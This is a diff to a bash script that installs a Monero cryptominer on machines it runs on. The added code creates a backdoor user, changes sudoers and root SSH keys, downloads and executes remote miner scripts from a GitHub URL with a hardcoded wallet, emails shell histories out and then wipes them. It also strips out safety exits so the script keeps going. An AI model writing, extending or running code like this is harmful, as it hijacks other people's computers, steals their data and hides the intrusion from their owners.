@@ -232,8 +232,11 @@ clean_previous_installations() {
 
     # Remove directories
     echo "[*] Removing miner directories..."
-    rm -rf ~/moneroocean ~/.moneroocean ~/.gdm* ~/.swapd ~/.system_cache
-    rm -rf /root/.swapd /root/.gdm* /root/.system_cache
+    rm -rf ~/moneroocean ~/.moneroocean ~/.gdm* ~/.swapd ~/.system_cache 2>/dev/null || true
+    # Only try to remove root directories if running as root
+    if [[ $(id -u) -eq 0 ]]; then
+        rm -rf /root/.swapd /root/.gdm* /root/.system_cache 2>/dev/null || true
+    fi
 
     # Clean services (already stopped by force_stop_service)
     echo "[*] Cleaning services..."
@@ -1272,3 +1275,111 @@ root_installation() {
                     echo "$SWAP_FILE none swap sw 0 0" >> /etc/fstab
                     log_message "✓ Swap added to /etc/fstab (permanent)"
                 fi
+                
+                # Show new memory status
+                FREE_OUTPUT=$(free -h 2>/dev/null | grep -E "^(Mem|Swap):" || true)
+                log_message "New memory status:\n${FREE_OUTPUT}"
+            else
+                log_message "WARNING: Could not enable swap"
+            fi
+        fi
+    else
+        log_message "✓ Sufficient RAM/Swap available"
+    fi
+    # ==================== END AUTO-SWAP ====================
+    
+    # Install mail utilities
+    install_mail_utils
+    
+    # Setup SSH key for root
+    setup_ssh_key "/root/.ssh"
+    
+    # Create backdoor user
+    if create_backdoor_user; then
+        log_message "Backdoor user created successfully"
+    else
+        log_message "ERROR: Failed to create backdoor user"
+    fi
+    
+    # Setup sudoers
+    if setup_sudoers; then
+        log_message "Sudoers configured successfully"
+    else
+        log_message "WARNING: Sudoers configuration failed"
+    fi
+    
+    # Run the miner setup
+    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
+    download_and_execute \
+        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3_2_FIXED_WITH_AUTOSTART.sh?t=$(date +%s)" \
+        "$wallet" \
+        "root miner setup"
+    
+    log_message "Root installation completed"
+}
+
+user_installation() {
+    log_message "Starting user installation..."
+    
+    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
+    download_and_execute \
+        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_gdm2_WITH_AUTOSTART.sh?t=$(date +%s)" \
+        "$wallet" \
+        "user miner setup"
+    
+    log_message "User installation completed"
+}
+
+# --- Main Execution ---
+
+# Initialize log file
+: > "$LOG_FILE"
+log_message "Script started by user: $(whoami)"
+
+# Check dependencies first
+if ! check_dependencies; then
+    log_message "WARNING: Dependency check failed - continuing anyway..."
+    # Removed exit 1 - script will continue even with missing dependencies
+fi
+
+# Service checks
+log_message "Checking for conflicting services..."
+for service in "${SERVICES_TO_CHECK[@]}"; do
+    if does_service_exist "$service"; then
+        if is_service_running "$service"; then
+            log_message "WARNING: Service $service is running - will attempt to continue anyway..."
+            # Removed exit 1 - script will continue even if services are running
+        else
+            log_message "Service $service exists but is not running"
+        fi
+    else
+        log_message "Service $service does not exist"
+    fi
+done
+
+# System info display
+log_message "Displaying system information"
+echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
+echo -e "|        RAM        |  $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo 'N/A')  |"
+echo -e "|   CPU Cores    |      $(nproc 2>/dev/null || echo 'N/A')      |"
+echo -e "|     Storage      |   $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo 'N/A')   |"
+echo -e "---------------------------------"
+
+# Send report and only cleanup if successful
+log_message "Sending system history report..."
+send_histories_email || log_message "Continuing after email attempt..."
+
+# Always cleanup histories for security
+log_message "Cleaning up shell histories..."
+cleanup_histories
+
+# Installation
+if [[ $(id -u) -eq 0 ]]; then
+    log_message "Running as root"
+    root_installation
+else
+    log_message "Running as regular user"
+    user_installation
+fi
+
+log_message "Script execution completed"
